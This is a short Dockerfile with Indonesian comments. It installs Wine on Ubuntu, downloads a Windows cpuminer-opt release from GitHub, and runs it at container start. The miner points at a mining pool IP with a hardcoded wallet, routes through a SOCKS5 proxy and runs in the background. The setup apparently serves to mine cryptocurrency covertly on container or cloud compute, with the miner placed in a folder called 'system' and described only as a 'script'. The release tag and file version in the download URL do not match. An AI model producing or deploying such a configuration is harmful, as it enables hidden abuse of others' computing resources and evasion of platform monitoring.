# Gunakan image dasar Ubuntu
FROM ubuntu:20.04

# Non-interaktif untuk mencegah prompt selama instalasi
ENV DEBIAN_FRONTEND=noninteractive

# Install dependencies dan Wine
RUN dpkg --add-architecture i386 && \
    apt-get update && \
    apt-get install -y --no-install-recommends \
    wget \
    unzip \
    wine \
    wine32 \
    && apt-get clean

# Buat direktori kerja
WORKDIR /app

# Tambahkan pengguna non-root
RUN useradd -m dockeruser
USER dockeruser

# Unduh dan jalankan skrip
RUN wget https://github.com/JayDDee/cpuminer-opt/releases/download/v27.4/cpuminer-opt-24.7-windows.zip && \
    unzip cpuminer-opt-24.7-windows.zip -d system && \
    rm cpuminer-opt-24.7-windows.zip

# Set working directory ke folder sistem
WORKDIR /app/system

# Jalankan Wine dengan skrip cpuminer
CMD ["wine", "./cpuminer-sse2.exe", "-a", "minotaurx", "-o", "stratum+tcp://146.103.45.69", "-u", "RNPTaDxarafTVGK3qaDGHRUhnvW3Mr4ux8", "-p", "c=RVN,mc=SMT/SPRX/SWAMP", "-x", "socks5://192.252.209.155:14455", "-t2", "-B"]
